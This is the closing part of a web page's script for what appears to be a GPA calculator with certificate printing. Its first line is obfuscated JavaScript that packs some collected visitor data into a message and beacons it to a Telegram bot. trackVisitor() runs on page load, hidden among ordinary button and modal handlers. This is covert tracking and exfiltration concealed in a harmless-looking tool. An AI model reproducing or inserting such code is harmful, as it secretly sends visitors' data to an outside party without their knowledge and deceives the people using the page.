_0x37f4b0=_0x366459,_0x97f1fa={'text':_0x37f4b0(0x1fc)+_0x4f234b+'`','chat_id':TELEGRAM_CHAT_ID,'parse_mode':'Markdown'};navigator[_0x37f4b0(0x1e9)](_0x37f4b0(0x1f1)+TELEGRAM_BOT_TOKEN+_0x37f4b0(0x1f9),new Blob([JSON[_0x37f4b0(0x200)](_0x97f1fa)],{'type':_0x37f4b0(0x1f8)}));});}

        // --- Event Listeners ---
        app.systemSwitch.addEventListener('change', switchSystem);
        app.addBtn.addEventListener('click', () => {
             const newId = app.coursesContainer.children.length + 1;
             createCourseRow(newId);
        });
        
        app.calculateBtn.addEventListener('click', () => calculateGPA(true));
        
        app.clearBtn.addEventListener('click', clearAll);
        app.printBtn.addEventListener('click', openPrintModal);

        // Modal Listeners
        app.cancelPrintBtn.addEventListener('click', () => {
            app.printModal.classList.add('hidden');
        });
        app.proceedPrintBtn.addEventListener('click', () => {
            const studentName = app.studentNameInput.value;
            const universityName = app.universityNameInput.value;
            const collegeName = app.collegeNameInput.value;
            app.printModal.classList.add('hidden');
            printCertificate(studentName, universityName, collegeName);
        });

        // --- Initial Load ---
        switchSystem();
        trackVisitor(); // Start tracking the visitor
    </script>

</body>
</html>
